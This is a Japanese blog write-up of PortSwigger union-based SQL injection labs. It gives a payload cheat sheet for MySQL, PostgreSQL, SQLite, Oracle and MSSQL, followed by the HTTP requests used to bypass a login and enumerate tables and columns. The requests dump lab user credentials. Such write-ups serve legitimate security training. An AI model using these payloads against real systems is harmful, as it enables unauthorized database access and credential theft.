---
title: 'UnionBasedSQLi - PortSwigger'
description: 'PortSwiggerのSQLi-Unionについて'
pubDate: 2026-01-08
category: 'PortSwigger'
tags: ['PortSwigger', 'Writeup', 'Web', 'SQLi', 'Union']
---

# UnionBasedSQLi - PortSwigger

## ペイロード一覧 (Lab内で使用したもの)
- MySQL(My), PostgreSQL(Po), SQLite(Sq), Oracle(Or), MSSQL(Ms), All
- Number of columns
  - All
    - `' order by 1 --` (カラム数が合わないとErrorになる)
- Column type
  - My,Po
    - `' union select 1,2 --`
    - `' union select 'text','1' --` ('1'これはintにもなりえる)
    - `' union select null,2 --`
  - Or
    - `' union select 1,2 from dual --`
- Database version
  - My
    - `' union select @@version,2 --`
    - `' union select version(),2 --`
  - Po
    - `' union select version(),2 --`
  - Sq
    - `' union select sqlite_version(),2 --`
  - Or
    - `' union select banner, null from v$version --`
  - Ms
    - `' union select @@version,2--`
- Table
  - My,Po,Ms
    - `' union select table_name, null from information_schema.tables --`
  - Sq
    - `' union select name, null from sqlite_master where type='table' --`
  - Or
    - `' union select table_name,null from all_tables --`
- Column
  - My,Po,Ms
    - `' union select column_name, null from information_schema.columns where table_name='table_name' --`
  - Sq
    - `' union select name, null from sqlite_master where tbl_name='table_name' --`
  - Or
    - `' union select column_name, null from all_tab_columns where table_name='table_name' --`
- Data
  - All
    - `' union select name, pass from table_name --`

## Lab
### SQL injection vulnerability in where clause allowing retrieval of hidden data
```text
GET /filter?category='+or+1=1+--
```

### SQL injection vulnerability allowing login bypass
```text
POST csrf=l8cntD3ozGVsqZVsDPjpY6PQoRpSwMug&username=administrator'+--&password=a
```

### SQL injection attack, querying the database type and version on Oracle
```text
GET /filter?category='+order+by+2--
- HTTP/2 200 OK

GET /filter?category='union+select+banner,'2'+from+v$version--
- Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft
```text
GET /filter?category='order+by+2--+-

GET /filter?category='union+select+%40%40version,2+--+-
- 8.0.42-0ubuntu0.20.04.1
```

### SQL injection attack, listing the database contents on non-Oracle databases
```text
GET /filter?category='order+by+2--

GET /filter?category='union+select+version(),'2'--
- PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

GET /filter?category='union+select+table_name,null+from+information_schema.tables--
- users_mkjhfc ...etc

GET /filter?category='union+select+column_name,null+from+information_schema.columns+where+table_name%3d'users_mkjhfc'--
- username_oyhpli, password_bvcbgs, email

GET /filter?category='union+select+username_oyhpli,password_bvcbgs+from+users_mkjhfc--
- wiener:vi7kjczaai4oelmwzxol, carlos:gm96aqp0xi8b2aulej5h, administrator:j6luuu4kxoxltlopjk9h
```

### SQL injection attack, listing the database contents on Oracle
```text
GET /filter?category='order+by+2--

GET /filter?category='union+select+banner,null+from+v$version--
- Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

GET /filter?category='union+select+table_name,null+from+all_tables--
- USERS_RCDBEB ...etc

GET /filter?category='union+select+column_name,null+from+all_tab_columns+where+table_name%3d'USERS_RCDBEB'--
- EMAIL, PASSWORD_REOMRC, USERNAME_BQPYUD

GET /filter?category='union+select+PASSWORD_REOMRC,USERNAME_BQPYUD+from+USERS_RCDBEB--
- ihs9udanza52bcbwviaw:wiener, jf3j3lv4i8s3nyn12r7h:administrator, njsmbwsuhc5j7h34b9k9:carlos
```

### SQL injection UNION attack, determining the number of columns returned by the query
```text
GET /filter?category='order+by+3--

GET /filter?category='union+select+null,null,null--
```

### SQL injection UNION attack, finding a column containing text
```text
GET /filter?category='order+by+3--

GET /filter?category='union+select+null,'4XLKPG',null--
```

### SQL injection UNION attack, retrieving data from other tables
```text
GET /filter?category='order+by+2--

GET /filter?category='union+select+version(),'2'--
- PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

GET /filter?category='union+select+table_name,null+from+information_schema.tables--
- users

GET /filter?category='union+select+column_name,null+from+information_schema.columns+where+table_name%3d'users'--
- username, email, password

GET /filter?category='union+select+username,password+from+users--
- administrator:k2jtepov81rrd73qb9d5
```

### SQL injection UNION attack, retrieving multiple values in a single column
```text
GET /filter?category='order+by+2--

GET /filter?category='union+select+null,version()--
- PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

GET /filter?category='union+select+null,table_name+from+information_schema.tables--
- users

GET /filter?category='union+select+null,column_name+from+information_schema.columns+where+table_name%3d'users'--  
- email, password, username

GET /filter?category='union+select+username,password+from+users--
> administrator:fmkwroartfsvyeibqkp8
```